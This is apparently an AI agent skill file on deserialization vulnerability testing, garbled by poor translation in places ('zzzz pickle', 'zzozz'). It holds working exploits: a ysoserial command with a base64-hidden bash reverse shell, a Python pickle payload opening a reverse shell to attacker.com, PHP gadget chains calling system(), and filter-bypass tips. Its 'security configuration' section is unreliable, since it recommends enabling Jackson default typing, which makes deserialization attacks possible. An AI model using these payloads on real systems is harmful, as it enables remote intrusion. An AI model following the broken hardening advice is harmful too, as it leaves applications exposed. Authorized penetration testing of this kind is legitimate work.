---
name: deserialization-testing
Professional skills and methodology for anti-sequential vulnerability testing
version: 1.0.0
---

# Counter-Sequencial Gap Test

## Overview

This skill provides detection, use, and protection against anti-sequentization holes.

## Vulnerability Principle

When the application converts the data counter-sequence of the sequenced data to the object, if the source of the data is not credible, the attacker can construct maliciously sequenced data and execute any code in the countersequencing process.

## Common Format

### Java

**Common library:**
- JavaNative Serialisation
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common function:**
- unserialize()
- json_decode()

### Python

**Common module:**
- pickle
- yaml
- json

### .NET

**Common Category:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Test Method

### 1. Identify Serial Data

**Java serialization characteristic:**
```
AC ED 00 05 (Hexadecimal)
rO0 (Base64)
```

**PHP serialization characteristic:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**zzzz pickle characteristic:**
```
\x80\x03
```

### 2. Detection of counter-sequencing points

**Common locations:**
- Cookie value
- SessionData
- APIParameter
- File Upload
- Cache Data
- Message Queue

### 3. JavaReverse Sequencing

**Apache Commons Operations uses:**
```java
// UsingysoserialGeneratePayload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common Gadget chain:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHPReverse Sequencing

**Base test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Use of magic methods:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Base test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Use ysoserial:**
```bash
# GeneratePayload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64Encoded
base64 -w 0 payload.bin
```

**Manually constructed:**
```java
// UsingGadgetThe chain's a malicious object.
// ReferencesysoserialSource
```

### PHP RCE

**Using POP chains:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding Bypass

**Base64 encoding:**
```
Original: rO0ABXNy...
Encoded: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter bypassed

**Using different Gadget chains:**
- If CommonsCollects are filtered, try Spring
- Try another version if one version is filtered

### Synchronising folder

**Use of reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Using the Tools

### ysoserial

```bash
# List availableGadget
java -jar ysoserial.jar

# GeneratePayload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# GenerateBase64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List availableGadget
./phpggc -l

# GeneratePayload
./phpggc Monolog/RCE1 system id

# Generate EncodingPayload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Interception of requests containing sequenced data
2. Use plugins to generatePayload
3. Replace raw data
4. Observe the Response

## Verification and Reporting

### Verification Steps

1. Confirm that you can control the sequenced data.
2. Verify counter-sequencing trigger execution
3. Assess the impact (zzozz, data leak, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Leak position and sequenced data formats
- Gadget chain or use method used
- the complete exploitation steps andPoC
- Remediation recommendations (entry validation, use of secure sequencing, etc.)

## Preventive Measures

### Recommended Approach

1. **Avoid counter-sequenced untrustworthy data**
   - Replace with JSON
   - Use secure sequence formatting

2. **Input Validation**
   ```java
   // White List authentication class name
   private static final Set<String> ALLOWED_CLASSES =
       Set.of("com.example.SafeClass");

   private Object readObject(ObjectInputStream ois) {
       // Verify the permission
       // ...
   }
   ```

3. **Use security configuration**
   ```java
   // JacksonConfigure
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD,
       JsonAutoDetect.Visibility.ANY);
   ```

4. **Class loader quarantine**
   - Use customClassLoader
   - Limit Loadable Classes

5. **Monitoring and Log**
   - Record counter-sequencing operations
   - Surveillance of anomalies

## Important Notes

- Perform only in an authorized testing environment
- Pay attention to the Gadget chain differences in different versions of the library
- Payload size limit during testing
- Reliance library version for understanding target applications